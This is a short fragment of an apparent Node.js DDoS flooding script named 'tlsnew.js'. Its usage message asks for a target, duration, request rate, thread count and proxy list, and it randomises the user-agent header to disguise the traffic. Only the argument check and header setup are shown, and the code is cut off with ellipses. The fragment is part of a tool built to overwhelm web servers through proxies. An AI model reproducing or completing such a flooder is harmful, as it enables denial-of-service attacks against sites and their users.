 ...
 if (process.argv.length < 7){console.log(`@Pasa\n node tlsnew.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
...
var uap9 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
headers["user-agent"] = uap9;
